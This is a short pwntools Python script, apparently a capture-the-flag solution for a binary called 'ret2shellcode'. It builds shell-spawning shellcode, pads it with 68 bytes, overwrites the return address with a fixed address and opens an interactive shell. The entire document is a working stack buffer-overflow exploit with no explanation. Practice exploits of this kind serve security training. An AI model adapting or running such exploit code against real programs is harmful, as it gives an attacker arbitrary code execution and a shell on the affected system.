from pwn import *
sh = process("./ret2shellcode")
shellcode = asm(shellcraft.sh())
payload = shellcode + ("A" * 68).encode() + p32(0x0804A080)
sh.recvline()
sh.sendline(payload)
sh.interactive()
